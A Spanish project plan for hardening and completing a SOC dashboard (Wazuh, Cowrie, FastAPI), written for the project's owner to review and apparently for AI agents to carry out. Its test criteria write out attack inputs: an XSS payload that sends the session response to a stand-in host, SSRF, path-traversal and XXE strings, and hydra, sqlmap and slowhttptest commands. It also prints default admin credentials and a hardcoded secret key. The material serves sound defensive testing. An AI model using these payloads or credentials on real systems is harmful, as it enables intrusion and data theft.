# PLAN MAESTRO DE CIERRE — VALHALLA SOC
**Fecha:** 2026-05-01
**Autor:** Yoandy Ramírez (planificación asistida por Claude Opus 4.7)
**Objetivo:** Llevar el proyecto desde su estado actual (funcional, pre-producción) hasta **producto terminado**: dashboard 100% pulido, todas las vistas conectadas y operativas, hardenizado contra los principales vectores de ataque (XSS, SQLi, fuerza bruta, CSRF, SSRF, IDOR, path traversal, DoS), con pruebas automatizadas y documentación completa.

> **Estándar de calidad:** No se acepta "suficientemente bueno". El criterio es *"esto está terminado"*. Cada fase tiene criterios de aceptación medibles y verificables. Nada se deja para después si la solución permanente está al alcance.

---

## 0. ESTADO ACTUAL (LÍNEA BASE — 2026-05-01)

### 0.1. Lo que YA funciona
- **SIEM real:** OpenSearch indexa alertas Wazuh (rule.groups=cowrie, mitre, etc.) y el backend FastAPI las consume vía 47 endpoints REST.
- **Honeypot activo:** Cowrie en :2222 captura intentos SSH/Telnet, los logs se decodifican con reglas custom y se mapean a MITRE ATT&CK.
- **IA local:** Ollama (`qwen2.5-coder:7b`) analiza alertas de nivel ≥5 y devuelve resumen + recomendación.
- **Auth funcional:** JWT + bcrypt, roles `admin / analyst / reporter / viewer`.
- **Dashboards conectados:** Overview, SIEM, Cowrie, ThreatMap, ThreatIntel, Assets, Workspace, Runbooks, Users, Profile, ExecutiveReport, LSAMonitor.
- **Geolocalización:** ip-api.com integrado para mapa de amenazas.
- **VirusTotal:** consultas IP/hash/dominio operativas.
- **Auto-sync de tickets desde alertas Wazuh** cada 2 min.
- **Modelos de datos:** User, Ticket, Alert, Event, AIAnalysis, IOCEntry, Evidence, Runbook (PostgreSQL).
- **Headers de seguridad básicos:** X-Content-Type-Options, X-Frame-Options, X-XSS-Protection, HSTS, Referrer-Policy.
- **Auditorías previas (Fase 1–4 de AUDITORIA_2026-04-19):** SSRF en Ollama, CSP `unsafe-inline`, cifrado de API key Ollama, escape XSS en feed, validación IPv4, sanitización agent ID, X-Forwarded-For spoofing, audit log básico, backup automático.

### 0.2. Lo que NO está terminado (BRECHAS REALES)

#### Brechas estéticas
1. Login muestra credenciales por defecto en pantalla (`admin / Valhalla2026!`) — UI fingerprinting + invitación a fuerza bruta.
2. `DashboardTest.tsx` huérfano (componente sin uso).
3. Inline styles masivos en `AppCore.tsx` (>500 props inline) — deuda visual y mantenibilidad.
4. `z-index: 2147483647` (max int32) en menús — síntoma de hacks de stacking.
5. Vista placeholder `"CONSTRUCCIÓN EN PROCESO // MODULE: ..."` aparece para rutas no implementadas (línea 512 de AppCore.tsx).
6. `IncidentsView.tsx` existe pero está **comentada** en `AppCore.tsx` línea 21 → ruta inactiva pero referenciada en el array de vistas válidas (línea 510).
7. `AlexanaLetter` / `AlexanaWord` reconstruyen letras letra-a-letra en SVG manual → frágil, no escala.
8. Sin skeleton loaders ni empty states consistentes.
9. Sin sistema de tema light/dark real (solo `data-scheme` para colores de acento).
10. `console.log` / `console.error` por todo el código (15+ en AnalystWorkspace, 3+ en DashboardSuperFinal, etc.).
11. Sin animaciones de transición entre vistas; cambio brusco.
12. Sin accesibilidad (WCAG 2.1 AA): contrastes no verificados, sin `aria-*`, sin focus visible coherente, sin keyboard navigation.

#### Brechas administrativas / conexiones inactivas
13. **IncidentsView no enrutada** (`incidents` referenciado en línea 510 pero sin handler).
14. **Audit Log sin UI** — el backend lo registra (Fase 3 previa) pero no hay vista para verlo.
15. **System Settings / Configuración global sin vista** — Ollama URL, VT API key, retención logs, todo se cambia editando archivos.
16. **Integrations Health sin vista única** — el estado de Wazuh, OpenSearch, Ollama, VT está disperso.
17. **Monitors view sin UI** — los 7 monitores SIEM (Brute Force, Login Exitoso, Malware, Reverse Shell, Evasión, Volumen Anómalo, Persistencia) se configuran vía script Python `setup_monitors.py` pero no hay panel administrativo.
18. **LSA Monitor backend incompleto** — el frontend llama endpoints no listados en `main.py`.
19. **Runbooks volátiles** — viven en memoria con fallback hardcoded; al reiniciar el backend, los nuevos creados se pierden.
20. **Geo-cache inexistente** — cada llamada a `/api/threat-map` consulta ip-api.com sin caché → bloqueo por rate limit (45 req/min).
21. **Sin paginación real** en `/api/wazuh/cowrie-sessions` y otros endpoints de listas largas.
22. **Self-service de password incompleto** — usuario no puede cambiar su propia contraseña desde Profile (solo admin reset).
23. **Export logs ausente desde UI** (CSV/JSON/STIX).
24. **Sin notificaciones push real-time** (WebSocket / SSE) — todo es polling cada 15–30s.
25. **Endpoints duplicados** — `/api/agents` (líneas 337 y 753 de main.py) y `/api/tickets/{id}` DELETE (465 y 501) → comportamiento ambiguo según orden de registro de FastAPI.
26. **Sin matriz visible de roles/permisos** en la UI (PLAN_AUTH_ROLES.md la define pero no se muestra al admin).
27. **Sin onboarding** para nuevos usuarios (cómo asignarse tickets, cómo escalar, atajos).

#### Brechas de seguridad (HARDENING)
28. **Secret JWT hardcoded** en `backend/app/settings.py:10` (`"valhalla-super-secret-key-2026"`) — riesgo CRÍTICO si se filtra el repo.
29. **Credenciales Wazuh/OpenSearch hardcoded** (settings.py líneas 15–22).
30. **`.env.example` no existe** — onboarding inseguro, los nuevos clonadores reutilizan defaults.
31. **`credenciales.txt` en raíz del repo** — auditar contenido y mover a vault o eliminar.
32. **Backups SQLite/PG sin cifrar** en `backend/backups/`.
33. **JWT en `localStorage`** del frontend — vector XSS robe-token. Migrar a `httpOnly` + `Secure` + `SameSite=Strict` cookies.
34. **Sin protección CSRF** en endpoints mutadores (POST/PUT/DELETE) — al usar cookies, el token CSRF es obligatorio.
35. **CSP no estricta** — actualmente permite inline (auditoría previa documentó refactor parcial).
36. **Sin rate-limiting global** por endpoint — solo login según informe; falta en `/api/vt/*`, `/api/threat-map`, `/api/analyze/*`, `/api/auth/login`.
37. **Validación de uploads débil** — `/api/tickets/{id}/evidence` no valida Content-Length, MIME real (`magic bytes`), tamaño máx, ni sandboxing del directorio destino. Riesgo path traversal.
38. **IDOR potencial** — endpoints `/api/tickets/{id}` no verifican ownership/asignación antes de exponer datos sensibles a `viewer`.
39. **Validación de input débil** en payloads JSON — Pydantic ayuda pero faltan validators custom (regex IPv4, longitud máxima en `description`, `notes`, etc.).
40. **Sin ORM-safe queries** verificadas — todos los `select()` usan SQLAlchemy 2.0 (parameterizado), pero hay que verificar que ninguna ruta concatene strings (especialmente `/api/wazuh/*` con OpenSearch DSL).
41. **Path traversal** en `/api/evidence/{id}/download` — verificar que `file_path` no permita `../` (sanitizar al guardar y validar al servir).
42. **Sin protección contra timing attacks** en login (bcrypt mitiga, pero `select(User)` revela existencia de usuario por timing distinto).
43. **Sin honeytokens / canary tokens** dentro del propio dashboard (irónico para un SOC).
44. **Sin monitoreo del propio dashboard** — el SOC no se vigila a sí mismo (Wazuh no recibe los logs de FastAPI).
45. **Sin política de retención** de logs Cowrie (acumulación indefinida → DoS por disco).
46. **Sin SBOM** ni dependency scanning automatizado (Snyk/Trivy/pip-audit).
47. **Tests de seguridad ausentes** — sin pytest, sin Vitest, sin Playwright, sin ZAP/Nuclei automatizados.
48. **Logs con datos sensibles** — `console.log` y `print` pueden filtrar tokens, IPs internas, payloads.

---

## 1. FASES DE EJECUCIÓN

> Cada fase es **autocontenible**: se puede entregar como rama Git separada, mergear con tests verdes, y desplegar sin romper nada anterior.

---

### **FASE 0 — Higienización del repositorio (1 día)**

**Objetivo:** Dejar el repo en estado limpio y reproducible antes de tocar lógica.

| Acción | Archivo(s) | Criterio de aceptación |
|---|---|---|
| 0.1 Auditar `credenciales.txt` y eliminar/mover a `.env` | raíz | Archivo no existe en HEAD ni en historial reciente |
| 0.2 Crear `.env.example` con todas las variables requeridas con valores dummy | `.env.example` | `cp .env.example .env && docker compose up` arranca sin tocar código |
| 0.3 Mover secretos hardcoded a `os.getenv` con `KeyError` si faltan en producción | `backend/app/settings.py` | `python -c "from app.settings import settings"` falla en prod sin `.env`; pasa en dev con defaults explícitos marcados `# DEV ONLY` |
| 0.4 Añadir `backend/backups/` y `*.db` al `.gitignore` | `.gitignore` | `git status` no muestra backups |
| 0.5 Eliminar `DashboardTest.tsx` y referencias | `frontend/app/src/ui/DashboardTest.tsx` | `grep -r DashboardTest` retorna 0 resultados |
| 0.6 Eliminar `console.log/error` de código de producción (mantener detrás de `import.meta.env.DEV`) | toda `frontend/app/src/` | `grep -r "console\." src/` solo muestra resultados envueltos en `if (DEV)` |
| 0.7 Resolver endpoints duplicados | `backend/app/main.py:337,753` y `:465,501` | OpenAPI `/docs` lista cada ruta una sola vez |
| 0.8 Pre-commit hooks: `ruff`, `prettier`, `eslint`, `gitleaks` | `.pre-commit-config.yaml` | `pre-commit run --all-files` pasa |
| 0.9 Añadir `Makefile` con `make dev / test / lint / build / scan` | `Makefile` | Cada target ejecuta sin error |

**Entregable:** PR `chore/phase-0-hygiene` con 9 commits atómicos.

---

### **FASE 1 — Hardening de Backend (2 días)**

**Estado:** ✅ Completado
**Objetivo:** Cerrar las brechas críticas de seguridad de la API antes de añadir features.

| Acción | Detalle | Criterio |
|---|---|---|
| 1.1 Externalizar `secret_key`, `wazuh_*`, `opensearch_*`, `virustotal_api_key` | `settings.py` con `pydantic-settings`; arrancar en prod si falta cualquier secreto crítico | `pytest tests/security/test_settings.py` pasa |
| 1.2 Migrar JWT de `localStorage` a `httpOnly + Secure + SameSite=Strict` cookie | `auth.py`, `main.py` `set_cookie`, frontend `api.ts` | XSS test no recupera el token (probar inyectando `<img src=x onerror=fetch('/api/auth/me').then(r=>r.text()).then(t=>fetch('//atacker.com',{method:'POST',body:t}))>` en un campo) |
| 1.3 Implementar CSRF token (double-submit pattern) en endpoints mutadores | middleware FastAPI + frontend interceptor | Petición POST sin CSRF token retorna 403; con token válido retorna 200 |
| 1.4 Rate-limiting por ruta crítica (`slowapi`) | `/api/auth/login` 5/min, `/api/vt/*` 10/min, `/api/threat-map` 6/min, `/api/analyze/*` 20/min | Test E2E supera el límite y recibe 429 |
| 1.5 Validación dura de uploads | `/api/tickets/{id}/evidence`: máx 10 MB, MIME por magic bytes (`python-magic`), filename sanitizado, ruta destino validada con `os.path.realpath().startswith(EVIDENCE_DIR)` | Subir `.exe` con extensión `.png` falla; subir 11 MB falla; payload con `../` en filename normaliza |
| 1.6 IDOR en `/api/tickets/{id}` | Verificar `current_user.role == admin` o `ticket.assigned_to_id == current_user.id` o `ticket.reporter_id == current_user.id`; viewer solo ve los suyos | Test: viewer A no puede leer ticket de viewer B (404) |
| 1.7 Validators Pydantic custom | IPv4 strict (octetos 0–255), CVE format, MITRE technique ID, longitud máx en text fields, sanitización de HTML en `description`/`notes` | Tests parametrizados verdes |
| 1.8 Path traversal en `/api/evidence/{id}/download` | Resolver path absoluto y validar contra `EVIDENCE_DIR`; rechazar si difiere | Test con `id` modificado para apuntar fuera del dir falla |
| 1.9 Mitigación timing attack en login | Hash dummy bcrypt comparado siempre, incluso si user no existe | Diferencia de tiempo entre user existente y no existente < 50 ms en p95 |
| 1.10 Headers extras: `Permissions-Policy`, `Cross-Origin-Embedder-Policy`, `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy` | `main.py` middleware | `securityheaders.com` (modo offline con `nikto -h localhost`) puntúa A+ |
| 1.11 CSP estricta sin `unsafe-inline`, sin `unsafe-eval`, con `nonce` por request | middleware genera nonce y lo inyecta en HTML servido | DevTools console: 0 violaciones de CSP |
| 1.12 Logging estructurado con `structlog`, sin secretos, sin tokens | `app/logging.py`, redact de campos sensibles | `grep -i "secret\|token\|password" backend/log.txt` retorna 0 |

**Entregable:** PR `feat/phase-1-backend-hardening` con tests pytest cubriendo cada item.

---

### **FASE 2 — Conectar las vistas inactivas (3 días)**

**Objetivo:** Toda vista referenciada en el menú existe, está enrutada, consume datos reales y tiene loading + empty + error states.

| Vista | Acción | Endpoints requeridos | Criterio |
|---|---|---|---|
| 2.1 **IncidentsView** | Re-habilitar import en AppCore (línea 21), conectar al menú lateral | `GET /api/incidents` (alias de tickets con filtro de severidad alta), CRUD existente | Vista carga lista paginada, filtra por severidad/estado, abre detalle |
| 2.2 **AuditLogView (NUEVO)** | Crear `frontend/app/src/ui/AuditLogView.tsx`. Tabla con filtros: usuario, acción, ruta, IP, fecha. | `GET /api/audit?user=&action=&from=&to=&page=&size=` (paginado, solo admin) | Admin ve registros de las últimas 72h, puede filtrar y exportar CSV |
| 2.3 **SystemSettingsView (NUEVO)** | Vista admin única para gestionar: Ollama URL/modelo, VT API key, retención logs, modo TLS estricto, alerta nivel mínimo de Ollama, tema por defecto | `GET/PUT /api/settings` (solo admin); secretos cifrados AES-256-GCM con clave derivada de `SECRET_KEY` | Cambios persisten en DB cifrados, no aparecen en logs, requiere relogin si afectan auth |
| 2.4 **IntegrationsHealthView (NUEVO)** | Panel único con estado de Wazuh Manager (`/manager/info`), Indexer (`_cluster/health`), Dashboard, Cowrie (count en últimos 5min), Ollama (`/api/tags`), VT (rate limit restante), PG (`SELECT 1`) | `GET /api/health/integrations` | Cada integración muestra ✅/⚠️/❌ con latencia ms y último error si lo hay |
| 2.5 **MonitorsView (NUEVO)** | Panel admin que enumera los 7 monitores SIEM (Brute Force, Login OK, Malware, Reverse Shell, Evasión, Volumen Anómalo, Persistencia), permite habilitar/deshabilitar, ver últimas alertas que dispararon, editar umbrales | `GET/PUT /api/monitors`, `GET /api/monitors/{id}/triggers` (Wazuh API) | Admin puede pausar un monitor sin tocar archivos en disco |
| 2.6 **LSA Monitor backend** | Implementar endpoints faltantes que consume `LSAMonitorView.tsx` | `GET /api/agents/{id}/lsa-status`, `POST /api/agents/{id}/lsa-harden` (envía comando vía Wazuh active response al agente Windows) | Test E2E sobre agente lab pasa de no-RunAsPPL a RunAsPPL=1 |
| 2.7 **Persistir Runbooks en DB** | Migrar lógica en memoria a `Runbook` model existente | `GET/POST/PUT/DELETE /api/runbooks` ya existen — eliminar fallback hardcoded y precargar 4 default vía Alembic seed | Reiniciar backend mantiene runbooks creados |
| 2.8 **Self-service password** | En `ProfileView`, formulario "Cambiar mi contraseña" (current + new + confirm) | `POST /api/auth/change-password` (requiere current válido) | Usuario cambia su pass sin pasar por admin |
| 2.9 **Geo-cache para ThreatMap** | Tabla `IpGeolocation(ip PK, country, city, lat, lon, isp, asn, cached_at)` con TTL 30 días | `/api/threat-map` consulta cache antes de ip-api.com | 100 IPs repetidas → 1 request a ip-api.com |
| 2.10 **Paginación real** | `cowrie-sessions`, `recent-alerts`, `audit`, `incidents`, `assets/packages` | `?page=1&size=50&sort=-created_at` con respuesta `{items, total, page, pages}` | Tests cubren first/middle/last page |
| 2.11 **Export CSV/JSON desde UI** | Botón "Exportar" en SIEM, Cowrie, ThreatMap, AuditLog | Reutilizar existing `/api/reports/executive` patrón | Click descarga archivo con timestamp en nombre |
| 2.12 **Notificaciones real-time SSE** | Server-Sent Events `/api/stream/notifications` para tickets nuevos, alertas críticas | Reemplaza polling 15s | Latencia de notificación < 2s |
| 2.13 **Vista "Construcción en proceso" eliminada** | El fallback de línea 512 desaparece (todas las vistas existen) | Cambiar a `<NotFoundView />` con sugerencia de volver a Overview | Ninguna ruta válida cae al placeholder |

**Entregable:** PR `feat/phase-2-views-wired` con migraciones Alembic, tests Vitest por vista, y screenshots de cada estado (loading/empty/error/success).

---

### **FASE 3 — UX Polish (2 días)**

**Objetivo:** Que se sienta producto premium, no proyecto fin de máster.

| Acción | Detalle | Criterio |
|---|---|---|
| 3.1 Eliminar credenciales por defecto en pantalla de login | AppCore.tsx líneas 305–307 | UI no revela `admin / Valhalla2026!`. Reemplazar por enlace "¿Primer login? Consultar manual" |
| 3.2 Migrar inline styles a CSS modules / clases en `HUD.css` | `AppCore.tsx`, `DashboardSuperFinal.tsx` | < 50 inline style props en todo el frontend (medido con `grep -c "style={{"`) |
| 3.3 Reemplazar `AlexanaLetter/Word` por componente `<BrandLogo />` con SVG paths optimizados o web font | nuevo `frontend/app/src/ui/BrandLogo.tsx` | Render < 16ms, 1 sola SVG por instancia |
| 3.4 Skeleton loaders consistentes | nueva `<Skeleton variant="card\|row\|chart" />` | Cada vista muestra skeleton durante fetch en lugar de "CARGANDO..." |
| 3.5 Empty states consistentes | nueva `<EmptyState icon title hint action />` | 0 vistas vacías sin mensaje |
| 3.6 Sistema de tema light/dark real | CSS variables via `data-theme="light"\|"dark"`, persistido en cookie | Toggle en menú usuario alterna en < 1 frame |
| 3.7 Animaciones de transición de vista | `framer-motion` o `view-transitions API`, fade+slide 200ms | Lighthouse "no janky animations" |
| 3.8 Accesibilidad WCAG 2.1 AA | Contraste min 4.5:1 todo texto, `aria-label` botones-icono, `role`, focus visible 2px outline, navegación con Tab | `axe-core` reporta 0 issues críticos |
| 3.9 Responsive 1024–4K | Breakpoints `sm/md/lg/xl/2xl`, sidebar colapsable < 1280px | Probar en 1366×768, 1920×1080, 2560×1440, 3840×2160 |
| 3.10 TV Mode pulido | Modo presentación en `tvMode` con KPI gigantes, rotación automática de paneles cada 30s | Activar desde Tweaks, oculta header y sidenav |
| 3.11 Keyboard shortcuts | `g o` (overview), `g s` (siem), `g w` (workspace), `/` (search), `?` (help) | Modal de ayuda lista shortcuts |
| 3.12 Onboarding tour primera vez | `react-joyride` con 6 pasos | Se dispara solo en primer login, se puede reanudar desde Profile |

**Entregable:** PR `feat/phase-3-ux-polish` con storybook (opcional) o galería de capturas en `docs/ux-gallery/`.

---

### **FASE 4 — Hardening de Frontend (1 día)**

**Objetivo:** El frontend no debe ser el eslabón débil.

| Acción | Detalle | Criterio |
|---|---|---|
| 4.1 Sanitizar todo HTML renderizado dinámicamente | Reemplazar cualquier `dangerouslySetInnerHTML` por `DOMPurify` o text plano | `grep -r dangerouslySetInnerHTML` retorna 0 |
| 4.2 Validación de input client-side espejo del server | longitudes, regex, mismo error message | Submit con payload inválido bloquea antes de request |
| 4.3 Subresource Integrity (SRI) en CDN scripts | hash SHA-384 en `<script integrity=...>` | Si el CDN cambia el archivo, el navegador rechaza |
| 4.4 Eliminar `eval`, `Function()`, `setTimeout(string)` | static analysis | `eslint-plugin-security` 0 warnings |
| 4.5 Trusted Types policy | `Content-Security-Policy: require-trusted-types-for 'script'` | Cualquier `innerHTML` con string crudo lanza error |
| 4.6 Auditoría de dependencias frontend | `npm audit --production` 0 high/critical, `npx better-npm-audit audit` | CI bloquea PR si aparecen vulns nuevas |
| 4.7 Build determinista | `package-lock.json` commiteado, versiones pinneadas | `npm ci` reproduce build idéntico (hash artifacts) |

**Entregable:** PR `feat/phase-4-frontend-hardening`.

---

### **FASE 5 — Pentest interno (2 días)**

**Objetivo:** Demostrar que el SOC resiste los ataques que detecta. Documentar resultados como informe ético.

> Se ejecutan **contra una instancia local del propio dashboard**, no contra el honeypot Cowrie. El usuario es admin del entorno → autorización legítima.

| Vector | Herramienta | Test concreto | Pass |
|---|---|---|---|
| 5.1 Fuerza bruta login | `hydra` + lista rockyou-trimmed | 200 intentos en 1 min sobre `/api/auth/login` | Bloqueo IP tras 5 fallos, 429 después |
| 5.2 SQLi | `sqlmap --crawl=3 --random-agent` sobre todos los endpoints | parámetros `id`, `query`, `q`, `search`, `filter` | sqlmap no detecta payload exitoso |
| 5.3 XSS reflejado/persistente | manual + `XSStrike` + Burp | inyectar `<svg/onload=alert(1)>` en `description`, `title`, `notes`, `username`, `analysis_notes`, `runbook.steps`, `evidence.filename` | Render escapa todo, no se ejecuta JS |
| 5.4 CSRF | request POST desde origen externo con cookie capturada | Crear ticket desde `evil.com` con `fetch(creds:'include')` | 403 sin token CSRF |
| 5.5 SSRF | payloads `http://169.254.169.254/`, `file:///etc/passwd`, `gopher://`, `dict://` en cualquier campo URL | `/api/ollama/check`, `/api/integrations/test` si existe | Whitelist rechaza, retorna 400 |
| 5.6 Path traversal | `../../../etc/passwd`, URL-encoded, doble-encoded en `/api/evidence/{id}/download`, `?file=` | retorna 400 o 404, nunca contenido fuera del dir |
| 5.7 IDOR | viewer A intenta leer/modificar ticket de viewer B vía manipulación de `id` | 403 o 404 consistente |
| 5.8 Path injection en filename de upload | `evidence.png\x00.exe`, `evidence.png/../../malware` | Sanitizado a UUID + extensión validada |
| 5.9 DoS / Slowloris / Slow POST | `slowhttptest -c 1000 -H -i 10 -r 200 -t POST -u http://localhost:8000/api/auth/login` | Backend mantiene < 1s respuesta a usuarios legítimos durante el ataque |
| 5.10 JWT attacks | `jwt_tool` — alg=none, alg confusion HS/RS, secret bruteforce, kid injection | Todos rechazados, retorna 401 |
| 5.11 Open redirect | `?next=//evil.com`, `?next=javascript:alert(1)` | Solo paths relativos permitidos |
| 5.12 XXE | upload de XML con `<!ENTITY xxe SYSTEM "file:///etc/passwd">` si algún endpoint parsea XML | rechazado o entidades deshabilitadas |
| 5.13 Mass assignment | POST a `/api/users` con `role: "admin"` desde viewer | Pydantic schema solo expone fields permitidos |
| 5.14 Race condition | 100 requests paralelos a `/api/tickets/{id}/assign` | Solo 1 asignación efectiva, lock pesimista o `UPDATE ... WHERE assigned_to_id IS NULL` |
| 5.15 Prototype pollution (Node tools que toquen frontend build) | `npm audit` + payload manual | CVE 0 |
| 5.16 Cabeceras inseguras | `nikto`, `securityheaders.com` offline con `headers-cli` | A+ score |
| 5.17 Subdominio takeover (si DNS) | manual revisión de CNAME | N/A en local; documentar para prod |
| 5.18 Honeytokens internos | inyectar IP/usuario canary en DB; alertar si alguien los consulta | Wazuh recibe alerta nivel 12 al consultar canary |
| 5.19 Sandbox del propio Cowrie hacia el dashboard | desde shell Cowrie intentar `curl http://valhalla-backend:8000` | Red Docker segmentada, conexión rechazada |
| 5.20 OWASP ZAP scan automatizado | `zap-baseline.py -t http://localhost:3000` | 0 high, < 5 medium documentados |

**Entregable:** `docs/INFORME_PENTEST_2026-05-XX.md` con cada test, evidencia (request/response), severidad CVSS 4.0, remediación, y CVE-style ID interno (`VLH-PENTEST-001..020`).

---

### **FASE 6 — Tests automatizados (2 días)**

**Objetivo:** Que ningún cambio futuro rompa lo que ya funciona.

| Capa | Stack | Cobertura objetivo | Criterio |
|---|---|---|---|
| 6.1 Backend unit | `pytest`, `pytest-asyncio`, `httpx.AsyncClient` | ≥80% líneas `app/` | `pytest --cov=app --cov-fail-under=80` pasa |
| 6.2 Backend integration | `pytest` + `testcontainers` (PG, OpenSearch mock) | Cada endpoint tiene happy path + 2 error paths | `pytest tests/integration/` pasa |
| 6.3 Backend security | `pytest` con casos OWASP top 10 inyectados | Cubre todos los items de Fase 5 | `pytest tests/security/` pasa |
| 6.4 Frontend unit | `vitest` + `@testing-library/react` | ≥70% en `lib/` y componentes puros | `npm test` pasa |
| 6.5 Frontend E2E | `playwright` | Login, crear ticket, asignar, resolver, ver audit log, logout | `npx playwright test` pasa |
| 6.6 Visual regression | `playwright-visual-comparison` | Screenshots de cada vista en 1920×1080 | Diff < 0.1% vs baseline |
| 6.7 Performance | `lighthouse-ci` | LCP < 2.5s, FID < 100ms, CLS < 0.1 | Score ≥ 90 |
| 6.8 Accessibility | `axe-playwright` | 0 violaciones serious/critical | Pasa |
| 6.9 Smoke tests post-deploy | shell script | `curl` verifica `/health`, login, dashboard summary | Exit 0 |

**Entregable:** PR `test/phase-6-automated-tests` + actualización del `Makefile` y CI.

---

### **FASE 7 — DevOps + Documentación final (1 día)**

| Acción | Criterio |
|---|---|
| 7.1 GitHub Actions / Gitea Actions: lint → test → build → security-scan → docker-build | Cada PR pasa los 5 gates |
| 7.2 Trivy + Grype scan de imágenes Docker | 0 critical, 0 high |
| 7.3 SBOM con `syft` | `sbom.spdx.json` adjunto a cada release |
| 7.4 Healthchecks completos en `docker-compose.yml` | `docker compose ps` muestra healthy en todos |
| 7.5 Política de retención de logs Cowrie en OpenSearch (ILM) | `wazuh-alerts-*` tras 90 días → cold; tras 365 → delete |
| 7.6 Backup PG cifrado con `pgbackrest` o script `pg_dump | age -e -r recipient` | Restauración de prueba en sandbox pasa |
| 7.7 Plan de respuesta a incidentes del SOC mismo (meta-runbook) | `docs/RUNBOOK_SOC_INCIDENT.md`: qué hacer si comprometen el SOC |
| 7.8 README actualizado con nuevo flujo, capturas nuevas, troubleshooting ampliado | Pasa revisión por usuario nuevo no técnico |
| 7.9 CHANGELOG.md con SemVer | v1.0.0 etiquetado |
| 7.10 LICENSE clarificada | GPLv2 vs componentes — verificar compatibilidad |
| 7.11 SECURITY.md (vulnerability disclosure) | Describe cómo reportar vulnerabilidades |
| 7.12 CONTRIBUTING.md | Estilo, branch naming, commits convencionales |

**Entregable:** Tag `v1.0.0` con release notes y artefactos firmados.

---

## 2. CRONOGRAMA SUGERIDO (12 días hábiles)

| Día | Fase | Hito |
|---|---|---|
| 1 | F0 | Repo limpio, secretos fuera, pre-commit funcionando |
| 2–3 | F1 | Backend hardenizado, tests de seguridad pasan |
| 4–6 | F2 | Vistas inactivas conectadas, persistencia real, SSE |
| 7–8 | F3 | UX premium, accesibilidad, responsive |
| 9 | F4 | Frontend hardenizado |
| 10–11 | F5 | Pentest interno con informe |
| 12 | F6+F7 | Tests CI verdes, release v1.0.0 |

> El usuario es exigente y rápido. Si Antigravity ejecuta sin fricción, esto comprime a 5–7 días con sesiones largas.

---

## 3. CRITERIOS DE ACEPTACIÓN GLOBALES (Definition of Done)

El proyecto está **terminado** cuando:

1. ✅ `make test` pasa con 0 fallos.
2. ✅ `make security-scan` (`gitleaks`, `trivy`, `pip-audit`, `npm audit`, `bandit`, `semgrep --config p/owasp-top-ten`) reporta 0 critical/high.
3. ✅ Pentest interno (Fase 5) tiene 0 findings critical/high abiertos.
4. ✅ Lighthouse ≥ 90 en Performance, Accessibility, Best Practices, SEO.
5. ✅ Todas las 14 vistas son alcanzables desde el menú, cargan datos reales, y manejan loading/empty/error.
6. ✅ Login no revela credenciales por defecto.
7. ✅ Backup automático verificado con restauración de prueba.
8. ✅ Wazuh detecta los ataques que un usuario malicioso podría lanzar contra el propio dashboard (honeytokens activos, logs FastAPI consumidos por Wazuh).
9. ✅ README actualizado, MANUAL completo, CHANGELOG con v1.0.0.
10. ✅ Demo grabada de 5 min mostrando login → overview → SIEM → workspace → ejecutar runbook → exportar reporte → audit log → logout.

---

## 4. RIESGOS Y MITIGACIONES

| Riesgo | Probabilidad | Impacto | Mitigación |
|---|---|---|---|
| Cambios de Wazuh API entre versiones | Media | Alta | Pinear Wazuh 4.9.5, documentar contratos en `wazuh_client.py`, abstraer detrás de interface |
| Migración JWT cookie rompe Electron desktop | Media | Media | Detectar `process.versions.electron` y mantener Bearer fallback solo para Electron |
| ip-api.com bloquea por volumen | Alta | Baja | Geo-cache (Fase 2.9) ya lo previene |
| Test E2E flaky por timing async | Alta | Media | `playwright` con `expect(...).toHaveText(..., {timeout:5000})`, no `waitForTimeout` |
| Refactor inline-styles rompe layout | Media | Media | Visual regression test (Fase 6.6) detecta cualquier shift |
| pentest causa indisponibilidad | Baja | Baja | Ejecutar en rama dedicada, snapshot Docker antes |

---

## 5. SIGUIENTES PASOS INMEDIATOS

1. **Revisar este plan**, marcar lo que se quiere cambiar/añadir/quitar.
2. **Aprobar `docs/PROMPT_ANTIGRAVITY_2026-05-01.md`** — es el prompt operativo que las IAs en Antigravity ejecutarán fase por fase.
3. **Crear ramas**: `git checkout -b chore/phase-0-hygiene` y comenzar.
4. **Configurar Antigravity** con acceso al repo + permiso de escritura en una rama de trabajo.
5. **Ejecutar Fase 0** con Antigravity siguiendo el prompt.
6. **Validar entregables** contra criterios antes de mergear.
7. Iterar por las 7 fases hasta v1.0.0.

---

*Documento vivo. Actualizar tras cada cierre de fase.*
